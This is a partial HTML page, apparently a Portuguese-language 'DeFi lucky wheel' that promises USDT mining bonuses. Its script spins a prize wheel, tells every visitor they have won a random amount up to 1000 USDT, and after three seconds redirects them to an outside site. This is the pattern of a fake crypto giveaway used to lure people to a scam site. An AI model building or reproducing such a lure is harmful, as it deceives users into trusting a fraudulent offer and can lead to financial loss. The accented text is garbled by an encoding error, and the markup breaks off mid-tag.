<body>

  <h1>üéâ Roda da Sorte DeFi</h1>
  <p>Gire e ganhe b√¥nus de minera√ß√£o USDT!</p>

  <div class="wheel-container">
    <div id="pointer"></div>
    <canvas id="wheelcanvas" width="400" height="400"></canvas>
  </div>

  <button id="spinbtn">GIRAR üéÅ</button>
  <div id="result"></div>

  <script>
    const prizes = [
      "5 USDT",
      "10 USDT",
      "30 USDT",
      "Experi√™ncia 3 dias",
      "100 USDT",
      "Obrigado",
      "Minera√ß√£o 7 dias",
      "1000 USDT"
    ];
    const colors = ["#f44336", "#e91e63", "#9c27b0", "#2196f3", "#4caf50", "#ff9800", "#00bcd4", "#8bc34a"];

    const canvas = document.getElementById("wheelcanvas");
    const ctx = canvas.getContext("2d");
    const centerX = canvas.width / 2;
    const centerY = canvas.height / 2;
    const radius = 180;
    const segmentAngle = (2 * Math.PI) / prizes.length;

    let currentAngle = 0;
    let isSpinning = false;

    function drawWheel(angle) {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      ctx.save();
      ctx.translate(centerX, centerY);
      ctx.rotate(angle);
      for (let i = 0; i < prizes.length; i++) {
        ctx.beginPath();
        ctx.fillStyle = colors[i];
        ctx.moveTo(0, 0);
        ctx.arc(0, 0, radius, i * segmentAngle, (i + 1) * segmentAngle);
        ctx.lineTo(0, 0);
        ctx.fill();

        ctx.save();
        ctx.rotate(i * segmentAngle + segmentAngle / 2);
        ctx.fillStyle = "#fff";
        ctx.font = "bold 16px Rubik";
        ctx.textAlign = "center";
        ctx.fillText(prizes[i], radius * 0.65, 0);
        ctx.restore();
      }
      ctx.restore();
    }

    function spin() {
      if (isSpinning) return;
      isSpinning = true;
      document.getElementById("result").textContent = "";
      const spins = Math.floor(Math.random() * 4) + 4;
      const randomIndex = Math.floor(Math.random() * prizes.length);
      const finalAngle = (2 * Math.PI) * spins + randomIndex * segmentAngle + segmentAngle / 2;

      let start = null;
      function animate(timestamp) {
        if (!start) start = timestamp;
        const elapsed = timestamp - start;
        const duration = 4000;
        if (elapsed < duration) {
          const progress = elapsed / duration;
          const ease = progress * (2 - progress);
          currentAngle = finalAngle * ease;
          drawWheel(currentAngle);
          requestAnimationFrame(animate);
        } else {
          currentAngle = finalAngle;
          drawWheel(currentAngle);
          const prize = prizes[randomIndex];
          document.getElementById("result").textContent = "üéä Voc√™ ganhou: " + prize;
          setTimeout(() => {
            window.location.href = "http://hot8881.com";
          }, 3000);
          isSpinning = false;
        }
      }
      requestAnimationFrame(animate);
    }

    drawWheel(0);
    document.getElementById("spinbtn").addEventListener("click", spin);
  </s
